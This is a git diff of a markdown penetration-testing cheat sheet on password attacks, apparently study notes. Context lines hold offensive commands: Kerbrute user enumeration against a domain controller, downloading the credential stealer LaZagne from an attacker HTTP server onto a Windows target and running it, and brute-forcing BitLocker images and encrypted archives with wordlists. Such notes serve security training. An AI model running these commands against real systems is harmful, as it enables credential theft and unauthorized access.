@@ -1,10 +1,10 @@
 ### Password Locations
 
 ```md
-- Files including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
-- History including logs, and command-line history
-- Memory including cache, and in-memory processing
-- Key-rings such as browser stored credentials
+- `Files`: including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
+- `History`: including logs, and command-line history
+- `Memory`: including cache, and in-memory processing
+- `Key-rings`: such as browser stored credentials
 ```
 
 ### Password Mutations
@@ -24,7 +24,6 @@ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolo
 
 # Kerbrute (after username-anarchy) to hone in on legitimate usernames
 ./kerbrute_linux_amd64 userenum --dc 10.129.202.85 --domain ILF.local names.txt
-
 ```
 
 ### Remote Password Attacks
@@ -101,8 +100,6 @@ attacker: python3 -m http.server 8000
 Win Target: Invoke-WebRequest -Uri http://10.10.14.118:8000/LaZagne.exe -OutFile $env:TEMP\LaZagne.exe
 Win Target: $path="$env:TEMP\LaZagne.exe"
 Win Target: & $path all
-
-
 ```
 
 ### Linux Local Password Attacks
@@ -163,7 +160,9 @@ bitlocker2john -i Backup.vhd > backup.hashes
 # Decrypt encrypted files with OpenSSL
 for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
 ```
+
 ### Network Services
+
 ```bash
 
 # Netexec
